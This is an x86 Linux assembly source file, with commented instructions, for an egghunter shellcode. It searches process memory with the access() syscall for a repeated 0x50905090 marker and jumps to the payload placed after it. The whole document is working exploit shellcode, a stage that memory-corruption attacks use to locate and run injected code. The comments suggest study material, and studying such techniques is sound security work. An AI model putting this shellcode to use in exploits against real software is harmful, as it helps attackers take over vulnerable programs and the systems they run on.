global _start

section .text

_start:

	xor ecx, ecx		; clear ecx, eax, and edx
	mul ecx

page_align:
	or dx, 0xfff		; increase edx to PAGE_SIZE 0x1000 or 4096 bytes
incpage:
	inc edx			; load address 4 bytes past edx into ebx
	lea ebx, [edx+0x4]	; compare ebx and [edx+4] (8 bytes) at the same time
	push byte +0x21		; access() syscall # 
	pop eax			; pop 0x21 into eax, saves a byte over xor
	int 0x80		; run access() which checks memory location of edx
	cmp al, 0xf2		; compare eax with EFAULT value, did we get an EFAULT?
	jz page_align		; yes = go back and increment the page to start again
	mov eax, 0x50905090	; if there was no EFAULT store egg inside eax
	mov edi, edx		; the mem addr that needs to be validated is placed in edi
	scasd			; does edi == eax and increment by 4 bytes
	jnz incpage		; if no match, try next address
	scasd			; first 4 bytes match does the last 4?
	jnz incpage		; if no match, try next address
	jmp edi			; the egg was found, jumps to edi which is to the payload
